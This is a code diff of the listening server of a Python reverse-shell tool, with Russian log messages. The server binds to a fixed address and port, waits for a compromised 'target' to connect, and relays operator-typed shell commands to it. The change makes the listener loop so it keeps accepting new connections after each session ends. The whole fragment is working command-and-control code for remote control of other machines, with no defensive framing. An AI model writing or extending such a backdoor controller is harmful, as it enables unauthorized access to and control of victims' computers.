@@ -84,6 +84,8 @@ def shell(target, ip):
             command = input(f"*Shell#~{ip}: ")
             reliable_send(command, target)
             if command == "q":
+                target.close()
+                logging.info("[+] Сервер и клиент закрыты.")
                 break
             elif command == "help":
                 show_help()
@@ -108,19 +110,21 @@ def shell(target, ip):
 
 # подключение и прослушивание
 def server():
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.bind(("192.168.178.67", 54321))
-            s.listen(1)
-            logging.info("[+] Ожидание подключения...")
-            target, ip = s.accept()
-            logging.info(f"[+] Подключение установлено с {ip}")
-            shell(target, ip)
-    except KeyboardInterrupt:
-        logging.info("\n[!] Сервер остановлен вручную")
-    except Exception as e:
-        logging.error(f"[!!] Критическая ошибка: {e}")
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.bind(("192.168.178.67", 54321))
+                s.listen(1)
+                logging.info("[+] Ожидание подключения...")
+                target, ip = s.accept()
+                logging.info(f"[+] Подключение установлено с {ip}")
+                shell(target, ip)
+        except KeyboardInterrupt:
+            logging.info("\n[!] Сервер остановлен вручную")
+        except Exception as e:
+            logging.error(f"[!!] Критическая ошибка: {e}")
+            break
 
 
 if __name__ == "__main__":
